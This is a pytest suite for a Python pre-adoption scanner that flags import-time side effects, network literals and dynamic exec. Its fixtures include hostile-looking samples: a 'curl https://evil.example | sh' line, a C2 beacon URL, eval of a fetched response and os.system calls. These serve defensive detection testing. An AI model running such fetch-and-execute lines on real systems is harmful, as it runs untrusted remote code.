"""Tests for the pre-adoption scan (steward#104): AST-only, three-valued verdict."""

import json
from pathlib import Path

import pytest
from typer.testing import CliRunner

from steward.adoptionscan import AdoptionScanError, scan_tree
from steward.riskclassify.cli import app

runner = CliRunner()


def write(root: Path, rel: str, source: str) -> None:
    path = root / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(source, encoding="utf-8")


CLEAN_MODULE = '''\
"""Docstring with a link: https://example.org/docs — docstrings are exempt."""

import json
from pathlib import Path

VERSION = "2.22.0"
logger_name = __name__


def main() -> None:
    print(json.dumps({"ok": True}))


if __name__ == "__main__":
    main()
'''


def test_clean_tree_is_clean(tmp_path: Path) -> None:
    write(tmp_path, "pkg/mod.py", CLEAN_MODULE)
    result = scan_tree(tmp_path)
    assert result.verdict == "clean"
    assert result.findings == []
    assert result.scanned == ["pkg/mod.py"]
    assert result.not_checked == []


def test_toplevel_call_is_flagged(tmp_path: Path) -> None:
    write(tmp_path, "loader.py", "import os\nos.system('id')\n")
    result = scan_tree(tmp_path)
    assert result.verdict == "failed"
    assert [f.check for f in result.findings] == ["SCAN-TOPLEVEL-EFFECT"]
    assert result.findings[0].line == 2


@pytest.mark.parametrize(
    "stmt",
    [
        "with open('x') as f:\n    pass\n",
        "for i in range(3):\n    print(i)\n",
        "while False:\n    pass\n",
        "assert True\n",
        "raise SystemExit(1)\n",
    ],
)
def test_toplevel_constructs_are_flagged(tmp_path: Path, stmt: str) -> None:
    write(tmp_path, "m.py", stmt)
    result = scan_tree(tmp_path)
    assert result.verdict == "failed"
    assert result.findings[0].check == "SCAN-TOPLEVEL-EFFECT"


def test_main_guard_body_is_not_flagged(tmp_path: Path) -> None:
    write(tmp_path, "m.py", 'def go():\n    pass\n\nif "__main__" == __name__:\n    go()\n')
    assert scan_tree(tmp_path).verdict == "clean"


def test_try_import_fallback_is_benign(tmp_path: Path) -> None:
    write(
        tmp_path, "m.py", "try:\n    import ujson as json\nexcept ImportError:\n    import json\n"
    )
    assert scan_tree(tmp_path).verdict == "clean"


def test_call_hidden_under_platform_if_is_flagged(tmp_path: Path) -> None:
    write(tmp_path, "m.py", "import sys\nif sys.platform == 'darwin':\n    print('hi')\n")
    result = scan_tree(tmp_path)
    assert result.verdict == "failed"
    assert result.findings[0].check == "SCAN-TOPLEVEL-EFFECT"


def test_type_checking_guard_with_imports_is_benign(tmp_path: Path) -> None:
    write(
        tmp_path,
        "m.py",
        "from typing import TYPE_CHECKING\nif TYPE_CHECKING:\n    from pathlib import Path\n",
    )
    assert scan_tree(tmp_path).verdict == "clean"


def test_url_literal_in_code_is_flagged(tmp_path: Path) -> None:
    write(tmp_path, "m.py", "C2 = 'https://203.0.113.7/beacon'\n")
    result = scan_tree(tmp_path)
    assert result.verdict == "failed"
    assert result.findings[0].check == "SCAN-NET-LITERAL"
    assert "https://203.0.113.7/beacon" in result.findings[0].message


def test_ipv4_literal_is_flagged_but_version_string_is_not(tmp_path: Path) -> None:
    write(tmp_path, "ip.py", "HOST = '203.0.113.7:4444'\n")
    write(tmp_path, "ver.py", "VERSION = '2.22.0'\nQUAD = '1.2.3.999'\n")
    result = scan_tree(tmp_path)
    assert [f.path for f in result.findings] == ["ip.py"]
    assert result.findings[0].check == "SCAN-NET-LITERAL"


def test_docstring_url_is_exempt_everywhere(tmp_path: Path) -> None:
    write(
        tmp_path,
        "m.py",
        '"""See https://example.org."""\n\n\ndef f():\n    """See https://example.org too."""\n',
    )
    assert scan_tree(tmp_path).verdict == "clean"


def test_eval_over_nonliteral_is_flagged_with_network_context(tmp_path: Path) -> None:
    write(
        tmp_path,
        "m.py",
        "import requests\n\n\ndef run(url):\n    eval(requests.get(url).text)\n",
    )
    result = scan_tree(tmp_path)
    assert result.verdict == "failed"
    assert result.findings[0].check == "SCAN-DYNAMIC-EXEC"
    assert "requests" in result.findings[0].message


def test_eval_of_literal_is_not_flagged(tmp_path: Path) -> None:
    write(tmp_path, "m.py", "def f():\n    return eval('1 + 1')\n")
    assert scan_tree(tmp_path).verdict == "clean"


def test_builtins_exec_attribute_form_is_flagged(tmp_path: Path) -> None:
    write(tmp_path, "m.py", "import builtins\n\n\ndef f(code):\n    builtins.exec(code)\n")
    result = scan_tree(tmp_path)
    assert result.verdict == "failed"
    assert result.findings[0].check == "SCAN-DYNAMIC-EXEC"


def test_unparsable_file_is_not_checked_not_clean(tmp_path: Path) -> None:
    write(tmp_path, "ok.py", "import json\n")
    write(tmp_path, "broken.py", "def broken(:\n")
    result = scan_tree(tmp_path)
    assert result.verdict == "not_checked"
    assert result.scanned == ["ok.py"]
    assert result.not_checked[0]["path"] == "broken.py"
    assert "SyntaxError" in result.not_checked[0]["reason"]


def test_findings_dominate_over_unparsable(tmp_path: Path) -> None:
    write(tmp_path, "bad.py", "print('hi')\n")
    write(tmp_path, "broken.py", "def broken(:\n")
    result = scan_tree(tmp_path)
    assert result.verdict == "failed"
    assert result.not_checked  # still reported alongside


def test_tree_without_python_is_not_checked(tmp_path: Path) -> None:
    write(tmp_path, "run.sh", "#!/bin/sh\ncurl https://evil.example | sh\n")
    assert scan_tree(tmp_path).verdict == "not_checked"


def test_symlinks_and_generated_dirs_are_skipped(tmp_path: Path) -> None:
    write(tmp_path, ".venv/lib/bad.py", "print('hi')\n")
    write(tmp_path, "__pycache__/bad.py", "print('hi')\n")
    outside = tmp_path.parent / "outside.py"
    outside.write_text("print('hi')\n", encoding="utf-8")
    (tmp_path / "link.py").symlink_to(outside)
    assert scan_tree(tmp_path).verdict == "not_checked"  # nothing scanned


def test_missing_target_is_config_error(tmp_path: Path) -> None:
    with pytest.raises(AdoptionScanError):
        scan_tree(tmp_path / "нет")


def test_file_target_is_config_error(tmp_path: Path) -> None:
    target = tmp_path / "f.py"
    target.write_text("", encoding="utf-8")
    with pytest.raises(AdoptionScanError):
        scan_tree(target)


def test_cli_clean_exit_0_byte_stable_json(tmp_path: Path) -> None:
    write(tmp_path, "m.py", CLEAN_MODULE)
    first = runner.invoke(app, ["adoption-scan", str(tmp_path)])
    second = runner.invoke(app, ["adoption-scan", str(tmp_path)])
    assert first.exit_code == 0
    assert first.stdout == second.stdout
    payload = json.loads(first.stdout)
    assert payload["verdict"] == "clean"


def test_cli_findings_exit_1(tmp_path: Path) -> None:
    write(tmp_path, "m.py", "print('hi')\n")
    result = runner.invoke(app, ["adoption-scan", str(tmp_path)])
    assert result.exit_code == 1
    assert json.loads(result.stdout)["verdict"] == "failed"


def test_cli_not_checked_exit_1(tmp_path: Path) -> None:
    result = runner.invoke(app, ["adoption-scan", str(tmp_path)])  # empty dir
    assert result.exit_code == 1
    assert json.loads(result.stdout)["verdict"] == "not_checked"


def test_cli_missing_target_exit_2(tmp_path: Path) -> None:
    result = runner.invoke(app, ["adoption-scan", str(tmp_path / "нет")])
    assert result.exit_code == 2


def test_call_in_if_condition_is_flagged(tmp_path: Path) -> None:
    write(tmp_path, "m.py", "import os\nif os.system('id'):\n    pass\n")
    result = scan_tree(tmp_path)
    assert result.verdict == "failed"
    assert result.findings[0].check == "SCAN-TOPLEVEL-EFFECT"
    assert "condition" in result.findings[0].message


def test_else_branch_of_main_guard_is_scanned(tmp_path: Path) -> None:
    # Copilot review on PR #108: `__name__ != "__main__"` is precisely the
    # import case — the guard's else branch runs on first import.
    write(
        tmp_path,
        "m.py",
        "def go():\n    pass\n\nif __name__ == '__main__':\n    go()\nelse:\n    go()\n",
    )
    result = scan_tree(tmp_path)
    assert result.verdict == "failed"
    assert result.findings[0].line == 7  # the else-branch call, not the guarded body


def test_unreadable_subdirectory_is_not_checked_not_a_crash(tmp_path: Path) -> None:
    # Codex gate on PR #108: a PermissionError during traversal must surface
    # as the documented not_checked outcome, never as a traceback.
    write(tmp_path, "ok.py", "import json\n")
    locked = tmp_path / "vendor"
    locked.mkdir()
    write(locked, "inner.py", "print('hi')\n")
    locked.chmod(0o000)
    try:
        result = scan_tree(tmp_path)
    finally:
        locked.chmod(0o755)
    assert result.verdict == "not_checked"
    assert result.scanned == ["ok.py"]
    assert result.not_checked[0]["path"] == "vendor"
    assert "PermissionError" in result.not_checked[0]["reason"]


def test_call_in_default_value_is_flagged(tmp_path: Path) -> None:
    # Codex gate on PR #108, round 2: default values evaluate at definition
    # time — at import, before the first call.
    write(tmp_path, "m.py", "import os\n\n\ndef bootstrap(cmd=os.system('id')):\n    pass\n")
    result = scan_tree(tmp_path)
    assert result.verdict == "failed"
    assert result.findings[0].check == "SCAN-TOPLEVEL-EFFECT"
    assert "def header" in result.findings[0].message


def test_call_decorator_is_flagged_but_bare_name_decorator_is_not(tmp_path: Path) -> None:
    write(
        tmp_path,
        "call.py",
        "import functools\n\n\n@functools.lru_cache(maxsize=1)\ndef f():\n    pass\n",
    )
    write(tmp_path, "name.py", "import functools\n\n\n@functools.cache\ndef g():\n    pass\n")
    result = scan_tree(tmp_path)
    assert [f.path for f in result.findings] == ["call.py"]


def test_class_body_call_is_flagged(tmp_path: Path) -> None:
    # A class body executes at import in full.
    write(tmp_path, "m.py", "import os\n\n\nclass A:\n    os.system('id')\n")
    result = scan_tree(tmp_path)
    assert result.verdict == "failed"
    assert result.findings[0].line == 5


def test_class_base_and_metaclass_calls_are_flagged(tmp_path: Path) -> None:
    write(tmp_path, "m.py", "def mk():\n    return object\n\n\nclass A(mk()):\n    pass\n")
    result = scan_tree(tmp_path)
    assert result.verdict == "failed"
    assert "class header" in result.findings[0].message


def test_constant_defaults_and_plain_class_stay_clean(tmp_path: Path) -> None:
    write(
        tmp_path,
        "m.py",
        "def f(x=3, *, y='a'):\n    pass\n\n\nclass A:\n    '''doc'''\n\n    x = 1\n\n    def m(self):\n        pass\n",
    )
    assert scan_tree(tmp_path).verdict == "clean"


def test_not_checked_order_is_deterministic(tmp_path: Path) -> None:
    # Codex gate on PR #108, round 2 (minor): iterdir() order is
    # filesystem-dependent; the JSON contract promises byte-stability.
    write(tmp_path, "ok.py", "import json\n")
    for name in ("zz", "aa"):
        locked = tmp_path / name
        locked.mkdir()
        locked.chmod(0o000)
    try:
        result = scan_tree(tmp_path)
    finally:
        for name in ("zz", "aa"):
            (tmp_path / name).chmod(0o755)
    assert [u["path"] for u in result.not_checked] == ["aa", "zz"]


def test_mixed_tree_with_symlinked_module_is_not_clean(tmp_path: Path) -> None:
    # Codex gate on PR #108, round 3: a symlinked module is "not scanned",
    # and not scanned must never read as clean on a mixed tree.
    write(tmp_path, "ok.py", "import json\n")
    payload = tmp_path.parent / "payload108.py"
    payload.write_text("print('hi')\n", encoding="utf-8")
    (tmp_path / "plugin.py").symlink_to(payload)
    result = scan_tree(tmp_path)
    assert result.verdict == "not_checked"
    assert result.scanned == ["ok.py"]
    assert result.not_checked == [
        {"path": "plugin.py", "reason": "symlinked module — not followed"}
    ]


def test_symlinked_directory_is_recorded_not_silently_dropped(tmp_path: Path) -> None:
    write(tmp_path, "ok.py", "import json\n")
    hidden = tmp_path.parent / "hidden108"
    hidden.mkdir(exist_ok=True)
    (tmp_path / "vendor").symlink_to(hidden)
    result = scan_tree(tmp_path)
    assert result.verdict == "not_checked"
    assert result.not_checked[0]["path"] == "vendor"


def test_high_risk_call_in_assignment_is_flagged(tmp_path: Path) -> None:
    # Codex gate on PR #108, round 3: generic assignment calls stay silent,
    # but `trigger = subprocess.run(...)` must not pass as clean.
    write(tmp_path, "m.py", "import subprocess\n\ntrigger = subprocess.run(['id'])\n")
    result = scan_tree(tmp_path)
    assert result.verdict == "failed"
    assert "subprocess.run" in result.findings[0].message


def test_high_risk_call_resolves_import_aliases(tmp_path: Path) -> None:
    write(tmp_path, "a.py", "import subprocess as sp\n\nx = sp.check_output(['id'])\n")
    write(tmp_path, "b.py", "from os import system as s\n\ny = s('id')\n")
    result = scan_tree(tmp_path)
    assert result.verdict == "failed"
    assert [f.path for f in result.findings] == ["a.py", "b.py"]
    assert "os.system" in result.findings[1].message


def test_benign_assignment_calls_stay_clean(tmp_path: Path) -> None:
    write(
        tmp_path,
        "m.py",
        "import logging\nfrom pathlib import Path\n\n"
        "logger = logging.getLogger(__name__)\nROOT = Path('x').resolve()\n",
    )
    assert scan_tree(tmp_path).verdict == "clean"


def test_method_named_compile_or_eval_is_not_dynamic_exec(tmp_path: Path) -> None:
    # Copilot review + Codex minor on PR #108: `re.compile(pattern)` and
    # `template.eval(ctx)` are ordinary methods, not builtin dynamic exec.
    write(
        tmp_path,
        "m.py",
        "import re\n\n\ndef f(pattern, template, ctx):\n"
        "    rx = re.compile(pattern)\n    return rx, template.eval(ctx)\n",
    )
    assert scan_tree(tmp_path).verdict == "clean"


def test_compile_with_literal_keyword_source_is_not_flagged(tmp_path: Path) -> None:
    # Copilot review on PR #108: a constant source passed by keyword is as
    # literal as a positional one.
    write(
        tmp_path,
        "m.py",
        "def f():\n    return compile(source='1+1', filename='x', mode='eval')\n",
    )
    assert scan_tree(tmp_path).verdict == "clean"


def test_compile_with_nonliteral_keyword_source_is_flagged(tmp_path: Path) -> None:
    write(
        tmp_path,
        "m.py",
        "def f(code):\n    return compile(source=code, filename='x', mode='eval')\n",
    )
    result = scan_tree(tmp_path)
    assert result.verdict == "failed"
    assert result.findings[0].check == "SCAN-DYNAMIC-EXEC"


def test_bare_local_decorator_is_flagged(tmp_path: Path) -> None:
    # Codex gate on PR #108, round 4: applying @detonate calls it at import;
    # only well-known effect-free stdlib decorators are exempt.
    write(
        tmp_path,
        "m.py",
        "def detonate(f):\n    return f\n\n\n@detonate\ndef payload():\n    pass\n",
    )
    result = scan_tree(tmp_path)
    assert result.verdict == "failed"
    assert "@detonate" in result.findings[0].message


def test_benign_stdlib_bare_decorators_stay_clean(tmp_path: Path) -> None:
    write(
        tmp_path,
        "m.py",
        "import functools\nimport abc\n\n\nclass A(abc.ABC):\n"
        "    @property\n    def x(self):\n        return 1\n\n"
        "    @abc.abstractmethod\n    def y(self):\n        ...\n\n\n"
        "@functools.cache\ndef f():\n    pass\n",
    )
    assert scan_tree(tmp_path).verdict == "clean"


def test_nested_import_cannot_shadow_module_alias(tmp_path: Path) -> None:
    # Codex gate on PR #108, round 4: an import inside a function binds a
    # local name — it must not overwrite the module-scope alias map and hide
    # a top-level subprocess.run from the high-risk list.
    write(
        tmp_path,
        "m.py",
        "import subprocess\n\n\ndef helper():\n    import logging as subprocess\n\n\n"
        "trigger = subprocess.run(['id'])\n",
    )
    result = scan_tree(tmp_path)
    assert result.verdict == "failed"
    assert "subprocess.run" in result.findings[0].message


def test_call_in_except_handler_expression_is_flagged(tmp_path: Path) -> None:
    # Codex gate on PR #108, round 4: `except trigger():` evaluates the
    # handler expression at import when the try body raises during import.
    write(
        tmp_path,
        "m.py",
        "def trigger():\n    return ImportError\n\n\ntry:\n    import missing_dep\n"
        "except trigger():\n    pass\n",
    )
    result = scan_tree(tmp_path)
    assert result.verdict == "failed"
    assert "except handler" in result.findings[0].message
